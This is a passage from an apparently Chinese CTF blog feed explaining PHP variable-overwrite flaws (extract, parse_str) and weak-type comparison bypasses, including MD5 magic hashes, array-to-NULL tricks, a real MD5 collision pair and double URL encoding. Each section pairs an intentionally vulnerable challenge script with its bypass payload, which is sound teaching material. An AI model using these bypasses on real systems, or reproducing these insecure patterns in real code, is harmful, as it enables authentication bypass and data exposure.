invoke__">extract</span>(<span class="hljs-variable">$my_array</span>, EXTR_PREFIX_SAME, <span class="hljs-string">&quot;dup&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\$a = <span class="hljs-subst">$a</span>; \$b = <span class="hljs-subst">$b</span>; \$c = <span class="hljs-subst">$c</span>; \$dup_a = <span class="hljs-subst">$dup_a</span>&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br><br>output:<br><span class="hljs-variable">$a</span> = Original; <span class="hljs-variable">$b</span> = Dog; <span class="hljs-variable">$c</span> = Horse; <span class="hljs-variable">$dup_a</span> = Cat<br><br></code></pre></td></tr></table></figure><h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><p>假如 <code>$shiyan</code> 的值等于文件的内容 <code>$content</code> 时，就打印出flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>); <br> <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$shiyan</span>)) &#123; <br>    <span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$flag</span>)); <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$shiyan</span> == <span class="hljs-variable">$content</span>) &#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>; <br>    &#125;<span class="hljs-keyword">else</span> &#123; <br>        <span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;Oh.no&#x27;</span>; <br>    &#125; <br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>同时传入 shiyan 和 flag 为空。使取文件错误，$content 为false（但实验出错）</p><p>这里还可以只传入shiyan为空。flag不传值，也会使文件读取错误，$content 为false</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?shiyan=&amp;flag=<br>?shiyan<br></code></pre></td></tr></table></figure><h3 id="parse-str-使用不当"><a href="#parse-str-使用不当" class="headerlink" title="parse_str() 使用不当"></a>parse_str() 使用不当</h3><p><strong>parse_str(string,array)</strong> ：<strong>查询字符串解析到变量中</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-string">&quot;name=Bill&amp;age=60&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$name</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$age</span>;<br><br>output: <br>Bill <span class="hljs-number">60</span><br></code></pre></td></tr></table></figure><h4 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>])) &#123;<br>   <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>   <span class="hljs-keyword">die</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>   <span class="hljs-keyword">include</span> (<span class="hljs-string">&quot;flag.php&quot;</span>);<br>    <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;www.OPENCTF.com&quot;</span>;<br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>];<br>    @<span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$id</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] != <span class="hljs-string">&quot;QNKCDZO&quot;</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;QNKCDZO&quot;</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;其实很简单其实并不难！&quot;</span>);<br>    &#125;<br>&#125;<br> <br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=a[<span class="hljs-number">0</span>]=s878926199a <br></code></pre></td></tr></table></figure><h2 id="Tricks"><a href="#Tricks" class="headerlink" title="Tricks"></a>Tricks</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$_</span>=<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-variable">$__</span>,<span class="hljs-variable">$___</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$__</span>==<span class="hljs-variable">$___</span>?<span class="hljs-variable">$___</span>:<span class="hljs-variable">$__</span>;<br>&#125;;<br><span class="hljs-comment">//定义了一个函数$_，对于传入$__,$___ 两个参数进行弱比较，相等则返回$___，不相等则返回$__</span><br><br><span class="hljs-variable">$$__</span>(<span class="hljs-variable">$_</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-variable">$___</span>&#125;[<span class="hljs-variable">$____</span>]&#123;<span class="hljs-variable">$_____</span>&#125;(),<span class="hljs-variable">$flag</span>));<br></code></pre></td></tr></table></figure><p>令<code>$__ == print_r</code> <code>$_($_GET&#123;$___&#125;[$____]&#123;$_____&#125;() == phpinfo()</code></p><p>phpinfo() 与 $flag 都是字符串，能通过弱类型比较。</p><p>Payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?__=x&amp;x=print_r&amp;____=a&amp;_____=b&amp;___=y&amp;y[a][b]=phpinfo<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>PHP</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP弱类型</title>
    <link href="/2023/02/02/php_weak_type/"/>
    <url>/2023/02/02/php_weak_type/</url>
    
    <content type="html"><![CDATA[<p>又是老生常谈的东西了，写文章主要是归档总结一下。</p><h2 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h2><p>PHP是弱类型语言，创建变量的时候不需要执行类型。使用时自动识别。</p><p>比较两个值是否相等时可以使用 <code>==</code> 或 <code>===</code> ：</p><p><code>$a == b</code> <strong>等于TRUE</strong>，如果类型转换后<code>$a</code>等于<code>$b</code></p><p><code>$a === b</code> <strong>全等TRUE</strong>，如果<code>$a</code>等于<code>$b</code>并且它们的类型也相等</p><p>在等于TRUE下会自动发生这些转换：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&#x27;&#x27;</span> == <span class="hljs-number">0</span> == <span class="hljs-literal">false</span><br><span class="hljs-string">&#x27;123&#x27;</span> == <span class="hljs-number">123</span><br><span class="hljs-string">&#x27;abc&#x27;</span> == <span class="hljs-number">0</span><br><span class="hljs-string">&#x27;123a&#x27;</span> = <span class="hljs-number">123</span><br><span class="hljs-string">&#x27;0x01&#x27;</span> == <span class="hljs-number">1</span><br><span class="hljs-string">&#x27;0e123456789&#x27;</span> == <span class="hljs-string">&#x27;0e987654321&#x27;</span><br>[<span class="hljs-literal">false</span>] == [<span class="hljs-number">0</span>] == [<span class="hljs-literal">NULL</span>] = [<span class="hljs-string">&#x27;&#x27;</span>]<br><span class="hljs-literal">NULL</span> == <span class="hljs-literal">false</span> == <span class="hljs-number">0</span><br><span class="hljs-literal">true</span> == <span class="hljs-number">1</span><br><span class="hljs-number">2022</span> = <span class="hljs-number">202.2e1</span> <span class="hljs-comment">//科学计数法</span><br></code></pre></td></tr></table></figure><h2 id="常见套路"><a href="#常见套路" class="headerlink" title="常见套路"></a>常见套路</h2><h3 id="弱类型MD5碰撞"><a href="#弱类型MD5碰撞" class="headerlink" title="弱类型MD5碰撞"></a>弱类型MD5碰撞</h3><p><code>0e</code> 开头的值在 <code>==</code> 判断相等时会被视为0，所以如果两个不同的密码经过哈希以后，其哈希值都是<code>0e</code>开头的话，那么PHP将会认为它们相等。</p><p>如果数据库中存在这种哈希值以 <code>0</code> 开头的密码的话，就可以以这个用户的身份轻易地登录进去。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">0e830400451993494058024219903391</span>QNKCDZO<span class="hljs-comment">//MD5   //原值</span><br><span class="hljs-number">0e545993274517709034328855841020</span>s878926199a<br></code></pre></td></tr></table></figure><h4 id="例题：-bugku-md5-加密相等绕过"><a href="#例题：-bugku-md5-加密相等绕过" class="headerlink" title="例题： bugku- md5 加密相等绕过"></a>例题： bugku- md5 加密相等绕过</h4><p>我们需要传入一个变量  a，这个变量 a 的要求是经过 md5 加密之后和 “QNKCDZO” 的加密结果相同。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$md51</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>);<br><span class="hljs-variable">$a</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$md52</span> = @<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>))&#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; <span class="hljs-variable">$md51</span> == <span class="hljs-variable">$md52</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&#123;*&#125;&quot;</span>;<br>      &#125; <br>      <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;false!!!&quot;</span>;<br>      &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;please input a&quot;</span>;&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?a=s878926199a<br></code></pre></td></tr></table></figure><h3 id="全等MD5绕过"><a href="#全等MD5绕过" class="headerlink" title="全等MD5绕过"></a>全等MD5绕过</h3><p>第一个 if 语句，如果 username 和 password 2 个变量相等会导致无法获得 flag。但是第二个 if 语句又要求 username 变量和 password 变量经过 md5() 函数加密的结果相同。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;flag&#123;test&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<br>            <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Your password can not be your username.&#x27;</span>;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<br>      <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Invalid password&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>注意此时遇到的是  <code>===</code> ，弱类型不起作用了。不过 md5 函数在传入数组时会报错返回 NULL ，当 2 个变量都导致报错返回 NULL 时就能使使得条件成立。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?username[]=<span class="hljs-number">1</span>&amp;password[]=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="真实MD5碰撞"><a href="#真实MD5碰撞" class="headerlink" title="真实MD5碰撞"></a>真实MD5碰撞</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br></code></pre></td></tr></table></figure><p>真实md5碰撞，由于string()函数，不能输入数组只能输入字符串</p><p>Payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a=%<span class="hljs-number">4</span>d%c9%<span class="hljs-number">68</span>%ff%<span class="hljs-number">0</span>e%e3%<span class="hljs-number">5</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">95</span>%<span class="hljs-number">72</span>%d4%<span class="hljs-number">77</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">72</span>%<span class="hljs-number">15</span>%<span class="hljs-number">87</span>%d3%<span class="hljs-number">6</span>f%a7%b2%<span class="hljs-number">1</span>b%dc%<span class="hljs-number">56</span>%b7%<span class="hljs-number">4</span>a%<span class="hljs-number">3</span>d%c0%<span class="hljs-number">78</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">7</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">18</span>%af%bf%a2%<span class="hljs-number">00</span>%a8%<span class="hljs-number">28</span>%<span class="hljs-number">4</span>b%f3%<span class="hljs-number">6</span>e%<span class="hljs-number">8</span>e%<span class="hljs-number">4</span>b%<span class="hljs-number">55</span>%b3%<span class="hljs-number">5</span>f%<span class="hljs-number">42</span>%<span class="hljs-number">75</span>%<span class="hljs-number">93</span>%d8%<span class="hljs-number">49</span>%<span class="hljs-number">67</span>%<span class="hljs-number">6</span>d%a0%d1%<span class="hljs-number">55</span>%<span class="hljs-number">5</span>d%<span class="hljs-number">83</span>%<span class="hljs-number">60</span>%fb%<span class="hljs-number">5</span>f%<span class="hljs-number">07</span>%fe%a2&amp;b=%<span class="hljs-number">4</span>d%c9%<span class="hljs-number">68</span>%ff%<span class="hljs-number">0</span>e%e3%<span class="hljs-number">5</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">95</span>%<span class="hljs-number">72</span>%d4%<span class="hljs-number">77</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">72</span>%<span class="hljs-number">15</span>%<span class="hljs-number">87</span>%d3%<span class="hljs-number">6</span>f%a7%b2%<span class="hljs-number">1</span>b%dc%<span class="hljs-number">56</span>%b7%<span class="hljs-number">4</span>a%<span class="hljs-number">3</span>d%c0%<span class="hljs-number">78</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">7</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">18</span>%af%bf%a2%<span class="hljs-number">02</span>%a8%<span class="hljs-number">28</span>%<span class="hljs-number">4</span>b%f3%<span class="hljs-number">6</span>e%<span class="hljs-number">8</span>e%<span class="hljs-number">4</span>b%<span class="hljs-number">55</span>%b3%<span class="hljs-number">5</span>f%<span class="hljs-number">42</span>%<span class="hljs-number">75</span>%<span class="hljs-number">93</span>%d8%<span class="hljs-number">49</span>%<span class="hljs-number">67</span>%<span class="hljs-number">6</span>d%a0%d1%d5%<span class="hljs-number">5</span>d%<span class="hljs-number">83</span>%<span class="hljs-number">60</span>%fb%<span class="hljs-number">5</span>f%<span class="hljs-number">07</span>%fe%a2<br></code></pre></td></tr></table></figure><p>值不等，md5相等即可。md5碰撞。</p><h3 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$num</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$num</span>))<br>&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-variable">$num</span>;<br>      <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;flag&#123;**********&#125;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>第一个if语句需要is_numeric()判断变量不是数字，第二个if语句需要$num==1，看似无解但可以通过弱类型绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?num=<span class="hljs-number">1</span>test<br></code></pre></td></tr></table></figure><h3 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a>十六进制与数字比较</h3><p>需要传入一个字符串变量 password，返回 flag 的条件是 password 的值和 number 变量的值相等。但是在判断两个变量是否相等之前，代码要先遍历 password 字符串，如果字符串中的字符转换为 ASCII 在 0 ~ 9 之间就会返回错误。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">noother_says_correct</span>(<span class="hljs-params"><span class="hljs-variable">$temp</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;flag&#123;test&#125;&#x27;</span>;<br>    <span class="hljs-variable">$one</span> = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-string">&#x27;1&#x27;</span>);    <span class="hljs-comment">//ord — 返回字符的 ASCII 码值</span><br>    <span class="hljs-variable">$nine</span> = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-string">&#x27;9&#x27;</span>);<br>    <span class="hljs-variable">$number</span> = <span class="hljs-string">&#x27;3735929054&#x27;</span>;<br>    <span class="hljs-comment">// Check all the input characters!</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$number</span>); <span class="hljs-variable">$i</span>++)<br>    &#123;<br>          <span class="hljs-comment">// Disallow all the digits!</span><br>          <span class="hljs-variable">$digit</span> = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$temp</span>&#123;<span class="hljs-variable">$i</span>&#125;);<br>          <span class="hljs-keyword">if</span> ( (<span class="hljs-variable">$digit</span> &gt;= <span class="hljs-variable">$one</span>) &amp;&amp; (<span class="hljs-variable">$digit</span> &lt;= <span class="hljs-variable">$nine</span>) )<br>          &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;flase&quot;</span>;<br>          &#125;<br>    &#125;<br>       <span class="hljs-keyword">if</span>(<span class="hljs-variable">$number</span> == <span class="hljs-variable">$temp</span>)<br>             <span class="hljs-keyword">return</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><span class="hljs-variable">$temp</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">noother_says_correct</span>(<span class="hljs-variable">$temp</span>);<br></code></pre></td></tr></table></figure><p>只要 password 的数值和 number 相等即可，可以通过进制转换来绕过。传入的 password 是 <code>3735929054</code> 的其他进制的即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?password = <span class="hljs-number">0</span>xpassword<br></code></pre></td></tr></table></figure><h3 id="数组返回-NULL-绕过"><a href="#数组返回-NULL-绕过" class="headerlink" title="数组返回 NULL 绕过"></a>数组返回 NULL 绕过</h3><p>第一个 if 语句使用了 ereg() 函数，用于搜索一个字符串中指定的字符串，整个表达式表示匹配由多个数字大小写字母组成的字符串。第二个 if 语句使用了strpos() 函数，用于查找字符串在另一个字符串中第一次出现的位置（区分大小写）。因此传入的 password 应该满足以数字或字母开头，且必须在 password 参数中找到 <code>--</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&quot;</span>; <br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)<br>          <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You password must be alphanumeric&#x27;</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-string">&#x27;--&#x27;</span>) !== <span class="hljs-literal">FALSE</span>)<br>          <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span> . <span class="hljs-variable">$flag</span>);<br>    <span class="hljs-keyword">else</span><br>          <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid password&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>因为 ereg 和 strpos 函数都只能处理字符串，如果传入数组返回的时NULL，NULL 不等于 false 同时满足两个条件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?password[]=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="urldecode-二次编码绕过"><a href="#urldecode-二次编码绕过" class="headerlink" title="urldecode 二次编码绕过"></a>urldecode 二次编码绕过</h3><p>首先题目需要输入变量 id，且变量 id 不能包含字符串 <code>hackerDJ</code>。接着使用 urldecode() 函数进行 url 解码，需要令解码后的字符串等于 <code>hackerDJ</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">eregi</span>(<span class="hljs-string">&quot;hackerDJ&quot;</span>,<span class="hljs-variable">$_GET</span>[id])) &#123;<br>      <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;not allowed!&quot;</span>);<br>      <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-variable">$_GET</span>[id] = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_GET</span>[id]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[id] == <span class="hljs-string">&quot;hackerDJ&quot;</span>)&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Access granted!&quot;</span>;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>显然我们可以通过二次URL编码来绕过，由于源码会使用 urldecode() 函数进行 url 解码，因此可以对 <code>hackerDJ</code> 进行二次URL编码。id 到达第一个 if 语句的时候还是 <code>%68%61%63%6b%65%72%44%4a</code> 到第二个 if 语句的时候已经被解码成 <code>hackerDJ</code> 了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id = %<span class="hljs-number">2568</span>%<span class="hljs-number">2561</span>%<span class="hljs-number">2563</span>%<span class="hljs-number">256</span>b%<span class="hljs-number">2565</span>%<span class="hljs-number">2572</span>%<span class="hljs-number">2544</span>%<span class="hljs-number">254</span>a<br></code></pre></td></tr></table></figure><h2 id="Tricks"><a href="#Tricks" class="headerlink" title="Tricks"></a>Tricks</h2><h3 id="科学计数法绕过"><a href="#科学计数法绕过" class="headerlink" title="科学计数法绕过"></a>科学计数法绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 